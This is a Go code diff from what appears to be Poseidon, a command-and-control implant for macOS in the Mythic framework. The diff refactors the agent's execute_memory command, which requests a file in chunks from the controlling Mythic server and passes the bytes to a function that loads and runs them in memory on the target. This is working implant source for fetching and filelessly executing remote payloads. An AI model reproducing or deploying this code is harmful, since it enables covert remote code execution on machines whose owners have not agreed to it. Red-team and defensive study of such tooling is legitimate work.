@@ -4,16 +4,14 @@ import (
 	// Standard
 	"encoding/json"
 	"fmt"
-	"sync"
 
 	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 // initial .m code pulled from https://github.com/its-a-feature/macos_execute_from_memory
 // and https://github.com/opensource-apple/dyld/tree/master/unit-tests/test-cases/bundle-memory-load
-var mu sync.Mutex
 
 type executeMemoryArgs struct {
 	FileID       string `json:"file_id"`
@@ -21,10 +19,8 @@ type executeMemoryArgs struct {
 	ArgString    string `json:"args"`
 }
 
-type getFile func(r structs.FileRequest, ch chan []byte) ([]byte, error)
-
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, ch chan []byte, f getFile) {
+func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 
@@ -33,33 +29,37 @@ func Run(task structs.Task, ch chan []byte, f getFile) {
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
-		encErrResp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
-	r := structs.FileRequest{}
-	r.TaskID = task.TaskID
+	r := structs.GetFileFromMythicStruct{}
 	r.FileID = args.FileID
-	r.ChunkNumber = 0
-	r.TotalChunks = 0
+	r.FullPath = ""
+	r.Task = &task
+	r.ReceivedChunkChannel = make(chan []byte)
+	task.Job.GetFileFromMythic <- r
 
-	fBytes, err := f(r, ch)
+	fileBytes := make([]byte, 0)
 
-	if err != nil {
-		msg.SetError(fmt.Sprintf("Failed to get file. Reason: %s", err.Error()))
-		encErrResp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-		mu.Unlock()
+	for {
+		newBytes := <-r.ReceivedChunkChannel
+		if len(newBytes) == 0 {
+			break
+		} else {
+			fileBytes = append(fileBytes, newBytes...)
+		}
+	}
+
+	if len(fileBytes) == 0 {
+		msg.SetError(fmt.Sprintf("Failed to get file"))
+		task.Job.SendResponses <- msg
 		return
 	}
 	//fmt.Printf("started run in execute_memory\n")
 	var final string
 	//fmt.Printf("%d\n", cap(fBytes))
 	//fmt.Printf("In Run, function_name: %s\n", args.FunctionName)
-	resp, _ := executeMemory(fBytes, args.FunctionName, args.ArgString)
+	resp, _ := executeMemory(fileBytes, args.FunctionName, args.ArgString)
 	//fmt.Printf("got response from executeMemory\n")
 	//fmt.Printf(resp.Message)
 	final = resp.Message
@@ -68,9 +68,6 @@ func Run(task structs.Task, ch chan []byte, f getFile) {
 	}
 	msg.Completed = true
 	msg.UserOutput = final
-	respMarshal, _ := json.Marshal(msg)
-	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, respMarshal)
-	mu.Unlock()
+	task.Job.SendResponses <- msg
 	return
 }
